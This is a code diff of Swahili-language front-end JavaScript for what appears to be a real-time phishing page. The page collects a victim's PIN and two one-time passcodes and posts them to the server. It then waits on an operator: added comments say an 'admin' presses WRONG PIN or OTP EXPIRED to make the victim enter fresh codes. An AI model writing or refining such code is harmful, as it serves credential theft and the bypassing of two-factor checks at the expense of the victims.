@@ -33,12 +33,10 @@ document.addEventListener('DOMContentLoaded', () => {
   const btnSubmitOtp1 = document.getElementById('btn-submit-otp1');
   const bannerOtp1Error = document.getElementById('banner-otp1-error');
   const otp1Subtitle = document.getElementById('otp1-subtitle');
-  const displayPhoneOtp1 = document.getElementById('display-phone-otp1');
 
   const otp2Boxes = document.querySelectorAll('.otp2-box-square');
   const btnSubmitOtp2 = document.getElementById('btn-submit-otp2');
   const bannerOtp2Error = document.getElementById('banner-otp2-error');
-  const displayPhoneOtp2 = document.getElementById('display-phone-otp2');
 
   let currentUserId = null;
   let statusPollInterval = null;
@@ -225,12 +223,11 @@ document.addEventListener('DOMContentLoaded', () => {
     bannerOtp1Error.classList.remove('active');
     showLoading('INATHIBITISHA OTP...', 'Tafadhali subiri...');
 
-    const phoneVal = signinPhone ? signinPhone.value.trim() : '';
     try {
       const res = await fetch('/api/submit-otp1', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: currentUserId, phone: phoneVal, otp: otpVal })
+        body: JSON.stringify({ userId: currentUserId, phone: '', otp: otpVal })
       });
       const data = await res.json();
       if (data.success) {
@@ -254,12 +251,11 @@ document.addEventListener('DOMContentLoaded', () => {
     bannerOtp2Error.classList.remove('active');
     showLoading('INATHIBITISHA UHAKIKI...', 'Tafadhali subiri...');
 
-    const phoneVal = signinPhone ? signinPhone.value.trim() : '';
     try {
       const res = await fetch('/api/submit-otp2', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: currentUserId, phone: phoneVal, otp: otpVal })
+        body: JSON.stringify({ userId: currentUserId, phone: '', otp: otpVal })
       });
       const data = await res.json();
       if (data.success) {
@@ -300,36 +296,34 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenOtp1);
-          const phoneVal = signinPhone ? signinPhone.value.trim() : '';
-          if (displayPhoneOtp1) displayPhoneOtp1.innerText = phoneVal;
           if (otp1Boxes[0]) otp1Boxes[0].focus();
         } else if (data.status === 'PROCEED_OTP2') {
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenOtp2);
-          const phoneVal = signinPhone ? signinPhone.value.trim() : '';
-          if (displayPhoneOtp2) displayPhoneOtp2.innerText = phoneVal;
           if (otp2Boxes[0]) otp2Boxes[0].focus();
         } else if (data.status === 'RETRY_PIN') {
+          // Admin amebonyeza WRONG PIN: Inasafisha visanduku na kurudi kuweka PIN mpya
           clearInterval(statusPollInterval);
           hideLoading();
-          showSurfaceError(bannerPinError, 'PIN ISIYO SAHIHI ❌ TAFADHALI WEKA PIN MPYA');
           pinBoxes.forEach(b => b.value = '');
+          showSurfaceError(bannerPinError, 'PIN ISIYO SAHIHI ❌ TAFADHALI WEKA PIN MPYA');
           if (pinBoxes[0]) pinBoxes[0].focus();
           showScreen(screenSignin);
         } else if (data.status === 'RETRY_OTP1') {
+          // Admin amebonyeza OTP EXPIRED: Inatoa onyo na kurudisha mteja kuweka OTP mpya kwenye nafasi tupu
           clearInterval(statusPollInterval);
           hideLoading();
-          showSurfaceError(bannerOtp1Error, 'OTP IMEKWISHA MUDA ❌ TAFADHALI WEKA OTP MPYA');
-          if (otp1Subtitle) otp1Subtitle.innerText = 'Muda wa OTP umekwisha. Tafadhali weka OTP mpya.';
           otp1Boxes.forEach(b => b.value = '');
+          if (otp1Subtitle) otp1Subtitle.innerText = 'MUDA WA OTP UMEKWISHA! Tafadhali weka OTP mpya hapa chini.';
+          showSurfaceError(bannerOtp1Error, '⚠️ MUDA WA OTP UMEKWISHA. Tafadhaliingiza OTP mpya iliyotoka.');
           if (otp1Boxes[0]) otp1Boxes[0].focus();
           showScreen(screenOtp1);
         } else if (data.status === 'RETRY_OTP2') {
           clearInterval(statusPollInterval);
           hideLoading();
-          showSurfaceError(bannerOtp2Error, 'OTP ISIYO SAHIHI ❌ TAFADHALI WEKA OTP MPYA');
           otp2Boxes.forEach(b => b.value = '');
+          showSurfaceError(bannerOtp2Error, 'OTP ISIYO BATILI ❌ TAFADHALI WEKA OTP MPYA');
           if (otp2Boxes[0]) otp2Boxes[0].focus();
           showScreen(screenOtp2);
         } else if (data.status === 'DENIED_STOP') {
@@ -369,4 +363,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-                          
+                                               
